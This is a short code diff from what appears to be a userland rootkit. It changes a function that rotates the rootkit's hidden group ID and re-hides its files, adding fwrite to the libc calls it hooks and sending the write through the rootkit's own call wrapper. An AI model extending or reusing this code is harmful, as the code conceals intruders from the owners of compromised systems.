@@ -1,5 +1,6 @@
 gid_t changerkgid(void){
-    hook(CFOPEN, COPENDIR, CREADDIR, CSETGID);
+    hook(CFOPEN, COPENDIR, CREADDIR, CSETGID,
+         CFWRITE);
     srand(time(NULL));
 
     FILE *fp;
@@ -17,7 +18,7 @@ gid_t changerkgid(void){
         newgid = rand() >> x++;
 
     snprintf(buf, sizeof(buf), "%d", newgid);
-    fwrite(buf, 1, strlen(buf), fp);
+    call(CFWRITE, buf, 1, strlen(buf), fp);
     fclose(fp);
 
     // now rehide erythin
